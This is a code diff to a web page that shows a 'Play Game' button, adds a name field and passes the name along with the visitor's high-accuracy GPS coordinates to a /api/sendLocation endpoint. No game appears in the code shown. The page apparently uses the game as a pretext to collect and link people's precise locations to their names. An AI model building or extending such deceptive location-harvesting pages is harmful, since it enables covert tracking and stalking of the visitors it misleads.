@@ -297,6 +297,28 @@
       Click the button below to play the game
     </p>
 
+    <!-- Add username input field -->
+    <div class="input-group" style="margin-bottom: 25px; width: 100%; max-width: 300px; margin-left: auto; margin-right: auto;">
+      <input 
+        type="text" 
+        id="username" 
+        placeholder="Enter your name" 
+        style="
+          width: 100%;
+          padding: 15px 20px;
+          border: 2px solid rgba(255, 255, 255, 0.2);
+          border-radius: 50px;
+          background: rgba(255, 255, 255, 0.1);
+          color: white;
+          font-size: 1rem;
+          outline: none;
+          transition: all 0.3s ease;
+        "
+        onfocus="this.style.borderColor='rgba(102, 126, 234, 0.8)'; this.style.background='rgba(255, 255, 255, 0.15)';"
+        onblur="this.style.borderColor='rgba(255, 255, 255, 0.2)'; this.style.background='rgba(255, 255, 255, 0.1)';"
+      />
+    </div>
+
     <button class="share-button" onclick="sendLocation()">
       <div class="loading-spinner"></div>
       <span class="button-text">📍 Play Game</span>
@@ -307,7 +329,7 @@
     </div>
 
     <div class="error-message" id="errorMessage">
-      ❌ Failed to start game. Please try again.
+      ❌ Failed to start game. Please try again or try a different name.
     </div>
   </div>
 
@@ -373,22 +395,46 @@
     }
 
     function sendLocation() {
+      const usernameInput = document.getElementById('username');
+      const username = usernameInput.value.trim();
+      
+      // Frontend validation
+      if (!username) {
+        showMessage("error");
+        document.getElementById('errorMessage').textContent = '❌ Please enter your name';
+        usernameInput.focus();
+        return false;
+      }
+      
+      // More specific validation - allow single character names
+      if (username.length > 30) {
+        showMessage("error");
+        document.getElementById('errorMessage').textContent = '❌ Name is too long (max 30 characters)';
+        usernameInput.focus();
+        return false;
+      }
+
       if (!navigator.geolocation) {
         showMessage("error");
-        return;
+        document.getElementById('errorMessage').textContent = '❌ Geolocation is not supported by your browser';
+        return false;
       }
 
       setLoadingState(true);
       showMessage("", false); // Hide any existing messages
 
-      navigator.geolocation.getCurrentPosition(success, error, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 60000,
-      });
+      navigator.geolocation.getCurrentPosition(
+        (position) => success(position, username), 
+        error, 
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 60000,
+        }
+      );
     }
 
-    async function success(position) {
+    async function success(position, username) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
@@ -396,7 +442,11 @@
         const response = await fetch("/api/sendLocation", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ lat, lon }),
+          body: JSON.stringify({ 
+            lat, 
+            lon,
+            username: username || 'Anonymous' 
+          }),
         });
 
         const result = await response.json();
